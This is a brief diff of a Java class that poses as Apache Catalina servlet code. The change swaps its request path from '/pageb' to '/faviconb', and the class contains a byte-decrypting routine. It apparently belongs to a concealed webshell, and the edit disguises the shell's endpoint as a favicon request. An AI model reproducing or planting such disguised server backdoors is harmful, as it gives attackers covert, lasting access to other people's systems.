@@ -3,7 +3,7 @@ package org.apache.catalina.servlets.sl;
 import org.apache.catalina.servlets.redefine.MyRequest;
 
 public class BX {
-    private static final String pathPattern= "/pageb";
+    private static final String pathPattern= "/faviconb";
     private static byte[] Decrypt(byte[] data) {
         byte[] dt = new byte[data.length];
         for (int i = 0; i < data.length; i++) {
